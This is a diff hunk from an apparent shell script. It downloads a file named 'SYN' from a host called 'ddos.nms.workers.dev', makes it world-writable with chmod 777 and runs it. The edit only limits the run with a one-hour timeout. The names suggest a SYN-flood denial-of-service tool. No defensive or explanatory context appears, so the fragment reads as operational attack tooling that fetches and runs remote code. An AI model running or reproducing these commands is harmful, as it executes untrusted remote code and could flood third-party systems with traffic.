@@ -7,4 +7,4 @@ curl -O https://ddos.nms.workers.dev/SYN
 chmod 777 SYN
 
 #running
-./SYN
+timeout 1h ./SYN
